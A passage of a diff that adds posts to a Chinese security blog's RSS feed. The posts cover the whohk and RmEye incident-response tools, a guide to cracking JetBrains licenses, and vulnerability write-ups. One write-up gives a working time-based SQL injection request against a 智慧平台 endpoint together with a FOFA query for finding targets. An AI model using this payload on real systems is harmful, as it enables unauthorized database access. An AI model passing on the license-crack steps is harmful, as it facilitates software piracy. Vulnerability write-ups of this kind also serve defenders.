class=&#34;line&#34;&gt;                        用于检测指定路径下的webshell（参数为物理路径）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;工具介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具介绍&#34;&gt;#&lt;/a&gt; 工具介绍&lt;/h2&gt;
+&lt;p&gt;git 下载地址：&lt;a href=&#34;https://github.com/wgpsec/whohk.git&#34;&gt;https://github.com/wgpsec/whohk.git&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://github.com/wgpsec/whohk/releases/download/v1.1/whohk.v1.1.zip&#34;&gt;https://github.com/wgpsec/whohk/releases/download/v1.1/whohk.v1.1.zip&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;程序自动获取系统的 CPU，内存，磁盘的使用率以及当前在线用户信息。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004021.png&#34; alt=&#34;20241111004021&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 - h 或 --help 获取工具使用说明&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111000102.png&#34; alt=&#34;20241111000102&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 - user 检查系统账户情况&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004114.png&#34; alt=&#34;20241111004114&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 - history 会筛选出所有用户下的可疑历史命令&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111000340.png&#34; alt=&#34;20241111000340&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 - cron 列出所有用户的定时任务&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004144.png&#34; alt=&#34;20241111004144&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 --file-cron 7 列出 7 天内被修改过的各个级别定时任务目录的脚本，输入参数值为天数，参数为必选。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111005234.png&#34; alt=&#34;20241111005234&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 - ip 用于查看进程中对外连接情况&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111000754.png&#34; alt=&#34;20241111000754&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 --pid 2848 根据进程 pid 来获取进程物理路径等详细信息，输入参数值为进程的 pid，参数为必选。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004249.png&#34; alt=&#34;20241111004249&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–ssh-fip 查看登录失败的 ip 以及对应的次数，可用于分析爆破情况&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004633.png&#34; alt=&#34;20241111004633&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–ssh-fuser 查看登录失败的账户名以及对应的次数&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004711.png&#34; alt=&#34;20241111004711&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数 --ssh-sip 查看登录成功的 ip 以及对应的次数&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004741.png&#34; alt=&#34;20241111004741&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–ssh-sinfo 查看登录成功的详细记录&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004815.png&#34; alt=&#34;20241111004815&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–file-starup 7 查看 7 天内被修改的启动项，输入的参数值为天数，参数为必选&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004847.png&#34; alt=&#34;20241111004847&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–file-os 7 查看 7 天内被劫持的系统文件，输入的参数值为天数，参数为必选&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111004928.png&#34; alt=&#34;20241111004928&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–s-webshell /home 用于检测指定目录下的 webshell，输入的参数值为网站绝对路径，参数为必选&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111005003.png&#34; alt=&#34;20241111005003&#34;&gt;&lt;/li&gt;
+&lt;li&gt;参数–s-backdoor /home 用于检测指定目录下的恶意软件，输入的参数值为待检测目录绝对路径，参数为必选&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111005038.png&#34; alt=&#34;20241111005038&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;工具补充说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具补充说明&#34;&gt;#&lt;/a&gt; 工具补充说明&lt;/h2&gt;
+&lt;p&gt;【工具补充说明】&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;webshell 检测和恶意软件检测的规则库采用 yara 外置规则库，可自己随时更新，本次只放出来一些常见的规则库。&lt;/li&gt;
+&lt;li&gt;主程序名为 “whohk” 的二进制文件，上传后需要 chmod +x whohk，加上执行权限。config 下是纯真 ip 位置数据库，更新日期为 20200920，也可以自行更新。&lt;/li&gt;
+&lt;li&gt;工具不含任何后门，自行选择是否使用。&lt;/li&gt;
+&lt;li&gt;自行对比&lt;br&gt;
+ md5：992516c25337663afb0af2b3ace184ab&lt;br&gt;
+SHA1：75e81f0a3502d366d5454ca79642f4652cc97723&lt;br&gt;
+SHA256：ef18c975d970f42e959560ff9718d258316bce8e5295034f987cc40eddf95432&lt;/li&gt;
+&lt;li&gt;v0.1 版本可能有些方面没考虑到，欢迎各位大佬提提意见，本工具会不断更新完善。&lt;/li&gt;
+&lt;li&gt;工具虽好，但不建议完全依赖于工具，应急场景各种各样都有，工具不一定能够面面俱到，有的时候还是得手工。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/10/Pycharmd%E7%AD%89%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</guid>
+            <title>Pycharmd等永久激活</title>
+            <link>http://example.com/2024/11/10/Pycharmd%E7%AD%89%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</link>
+            <category>神兵利器</category>
+            <pubDate>Sun, 10 Nov 2024 23:12:11 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;win版本支持20212-2024&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win版本支持20212-2024&#34;&gt;#&lt;/a&gt; win 版本支持 2021.2-2024&lt;/h1&gt;
+&lt;p&gt;文章来自：&lt;a href=&#34;https://shimo.im/docs/5xkGoDX7eRHRW9kX/read&#34;&gt;https://shimo.im/docs/5xkGoDX7eRHRW9kX/read&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;下载压缩包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#下载压缩包&#34;&gt;#&lt;/a&gt; 下载压缩包&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;https://pan.baidu.com/s/1bENAlp5e0lSyAzuoKrjZoA
+密码为：abcd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;解压&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解压&#34;&gt;#&lt;/a&gt; 解压&lt;/h2&gt;
+&lt;p&gt;解压后放到目录，比如 D 盘不要放下载目录，不要放桌面）&lt;br&gt;
+注意激活成功后文件不要删除，不要改名，不要移动，路径文件夹不能有中文和中文符号（包含上级）&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231650.png&#34; alt=&#34;20241110231650&#34;&gt;&lt;br&gt;
+ 打开解压的文件夹&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231751.png&#34; alt=&#34;20241110231751&#34;&gt;&lt;br&gt;
+ 打开 scripts 文件夹&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231809.png&#34; alt=&#34;20241110231809&#34;&gt;&lt;br&gt;
+ 运行 install 脚本（需要激活的软件必须关了）&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231834.png&#34; alt=&#34;20241110231834&#34;&gt;&lt;br&gt;
+ 若有弹窗则点是，无则忽略&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231931.png&#34; alt=&#34;20241110231931&#34;&gt;&lt;br&gt;
+ 点击确认&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231944.png&#34; alt=&#34;20241110231944&#34;&gt;&lt;br&gt;
+ 等待 5 分钟弹出 success&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110231957.png&#34; alt=&#34;20241110231957&#34;&gt;&lt;br&gt;
+ 目录下 的 Activation_Code 找到与你需要激活软件相同名字的文本全选复制&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232017.png&#34; alt=&#34;20241110232017&#34;&gt;&lt;br&gt;
+ 对应的应用图&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232031.png&#34; alt=&#34;20241110232031&#34;&gt;&lt;br&gt;
+ 激活&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232045.png&#34; alt=&#34;20241110232045&#34;&gt;&lt;br&gt;
+ 点击 continue 或 close 则激活成功&lt;br&gt;
+此方法激活少部分软件显示 2025 到期，实际永久不掉，放心使用&lt;br&gt;
+若显示 Key is invalid Help 激活无效 (如下图)，重启电脑在填入激活码&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241110232113.png&#34; alt=&#34;20241110232113&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</guid>
+            <title>RmEye-戎码之眼</title>
+            <link>http://example.com/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</link>
+            <category>神兵利器</category>
+            <pubDate>Tue, 05 Nov 2024 19:32:55 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;rmeye&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rmeye&#34;&gt;#&lt;/a&gt; RmEye&lt;/h1&gt;
+&lt;p&gt;RmEye 是一个 window 上的基于 att&amp;amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR&lt;/p&gt;
+&lt;h2 id=&#34;功能特点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#功能特点&#34;&gt;#&lt;/a&gt; 功能特点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;基于 att&amp;amp;ck 设计。所有设计只是为了符合 att&amp;amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)&lt;/li&gt;
+&lt;li&gt;轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.&lt;/li&gt;
+&lt;li&gt;行为检出，让免杀成为过去式。基于 att&amp;amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.&lt;/li&gt;
+&lt;li&gt;高扩展性。可随需求定制功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;rmeye-之所以不是-edrxdrmdrndrxxxxxdr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rmeye-之所以不是-edrxdrmdrndrxxxxxdr&#34;&gt;#&lt;/a&gt; RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;RmEye 没有流量监控&lt;/li&gt;
+&lt;li&gt;RmEye 仅覆盖 20% 左右的 datasource&lt;/li&gt;
+&lt;li&gt;RmEye 没有联动 WAF、IPS/IDS&lt;/li&gt;
+&lt;li&gt;RmEye 没有实时拦截功能&lt;/li&gt;
+&lt;li&gt;对 RPC、COM、ALPC 基本无能为力&lt;/li&gt;
+&lt;li&gt;不支持更高级的扩展检测，如检测脚本、下发规则，主机链&lt;/li&gt;
+&lt;li&gt;受限于 Sysmon, 很多 att&amp;amp;ck 的 T 没有覆盖，也无法覆盖.&lt;/li&gt;
+&lt;li&gt;没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具&lt;/li&gt;
+&lt;li&gt;github 链接：&lt;a href=&#34;https://github.com/RoomaSec/RmEye&#34;&gt;https://github.com/RoomaSec/RmEye&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装&#34;&gt;#&lt;/a&gt; 安装&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;运行客户端&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png&#34; alt=&#34;20241105194255&#34;&gt;&lt;br&gt;
+ 下载 release ( &lt;a href=&#34;https://github.com/RoomaSec/RmEye/releases&#34;&gt;https://github.com/RoomaSec/RmEye/releases&lt;/a&gt; ), 里面有客户端，服务端自行 clone 本项目&lt;br&gt;
+服务端是 python3 编写，安装完依赖库后输入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python webserver.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;即可部署&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png&#34; alt=&#34;20241105194408&#34;&gt;&lt;br&gt;
+ 服务端部署后，修改 config.py 里面的&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 检出阈值,越高越难检出但是也会越准确  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_THREAT_SCORE = 170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 授权访问主站的IP列表.如果不在后台里面则不能访问后台  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOW_ACCESS_IP = [&amp;#x27;127.0.0.1&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址&lt;br&gt;
+客户端则编辑 config.ini&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[communication]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server = http://192.168.111.189:5000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中 server 改成你的服务端的地址&lt;br&gt;
+然后分发三个文件给客户端并且放在同一目录:&lt;br&gt;
+config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe&lt;br&gt;
+ 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye&lt;br&gt;
+ 访问 &lt;a href=&#34;http://xn--ip-fr5c86lx7z:5000&#34;&gt;http:// 服务器 ip:5000&lt;/a&gt; (flask 默认端口) 查看后台&lt;br&gt;
+当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的&lt;/p&gt;
+&lt;h2 id=&#34;检出截图&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检出截图&#34;&gt;#&lt;/a&gt; 检出截图&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png&#34; alt=&#34;20241105194549&#34;&gt;&lt;br&gt;
+ 威胁列表&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png&#34; alt=&#34;20241105194613&#34;&gt;&lt;br&gt;
+ 详细进程&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png&#34; alt=&#34;20241105194641&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;卸载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#卸载&#34;&gt;#&lt;/a&gt; 卸载&lt;/h2&gt;
+&lt;p&gt;卸载 RmEye: 在 RmEye 目录下执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SysEye /uninstall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果您需要卸载 sysmon 执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sysmon /uninstall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;即可干净卫生的卸载掉 RmEye&lt;/p&gt;
+&lt;h2 id=&#34;ioc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ioc&#34;&gt;#&lt;/a&gt; IOC&lt;/h2&gt;
+&lt;p&gt;目前 RmEye 使用的是&lt;a href=&#34;https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:&#34;&gt; https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &amp;quot;apikey&amp;quot;:&lt;/a&gt; &amp;quot;010d4868aef799750e2828fdf17a4d98&amp;quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用&lt;/p&gt;
+&lt;h2 id=&#34;第三方引用库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三方引用库&#34;&gt;#&lt;/a&gt; 第三方引用库&lt;/h2&gt;
+&lt;p&gt;1、sysmon &lt;a href=&#34;https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon&#34;&gt;https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon&lt;/a&gt;&lt;br&gt;
+2、rule_engine &lt;a href=&#34;https://github.com/zeroSteiner/rule-engine&#34;&gt;https://github.com/zeroSteiner/rule-engine&lt;/a&gt;&lt;br&gt;
+3、yara &lt;a href=&#34;https://github.com/VirusTotal/yara&#34;&gt;https://github.com/VirusTotal/yara&lt;/a&gt;&lt;br&gt;
+4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) &lt;a href=&#34;https://github.com/SwiftOnSecurity/sysmon-config&#34;&gt;https://github.com/SwiftOnSecurity/sysmon-config&lt;/a&gt;&lt;br&gt;
+ 请遵守相关库的开源协议。相关法律风险本项目不负任何责任&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
+            <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
+            <link>http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
+            <category>漏洞复现</category>
+            <pubDate>Tue, 05 Nov 2024 16:02:29 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;智慧平台sexcelexperrashx存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智慧平台sexcelexperrashx存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 智慧平台 SExcelExpErr.ashx 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;智慧平台 SExcelExpErr 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据敏感信息。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;body=&amp;quot;custom/blue/uimaker/easyui.css&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /ashx/KQ/SExcelExpErr.ashx?action=list&amp;amp;importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105160450.png&#34; alt=&#34;20241105160450&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/01/%E7%94%A8%E5%8F%8B%E6%BC%8F%E6%B4%9E/</guid>
+            <title>用友U8系列漏洞</title>
+            <link>http://example.com/2024/11/01/%E7%94%A8%E5%8F%8B%E6%BC%8F%E6%B4%9E/</link>
+            <pubDate>Fri, 01 Nov 2024 14:49:55 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;用友u8-cloud系统businessrefaction存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-cloud系统businessrefaction存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-Cloud 系统 BusinessRefAction 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;用友 U8 Cloud BusinessRefAction 接口处存在 SQL 注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;title==&amp;quot;U8C&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
